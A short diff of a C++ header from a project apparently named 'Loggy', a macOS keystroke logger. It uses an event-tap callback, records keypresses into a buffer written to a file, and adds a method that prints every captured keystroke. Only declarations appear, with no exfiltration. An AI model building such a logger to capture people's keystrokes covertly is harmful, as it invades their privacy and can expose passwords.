@@ -24,11 +24,6 @@ CGEventRef eventCallback(CGEventTapProxy, CGEventType, CGEventRef, void *);
 void getKeyStrokes();
 
 namespace Loggy {
-    class Core {
-    public:
-        Core();
-    };
-
     class JsonWriter {
     public:
         JsonWriter(Loggy::Types::OPERATING_SYSTEM system);
@@ -40,11 +35,18 @@ namespace Loggy {
         * @return void
         */
         void Write(char data, unsigned long rawData);
+        /*
+        * Prints the buffer in a readable format. I.e. prints all keystrokes that have been pressed.
+        *
+        * @return void
+        */
+        void Print();
         ~JsonWriter();
     private:
         time_t _timeGenesis;
         Loggy::Types::OPERATING_SYSTEM _operatingSystem;
-        char* _buffer;
+        std::string _buffer;
+        std::ofstream _outStream;
     };
 }
 
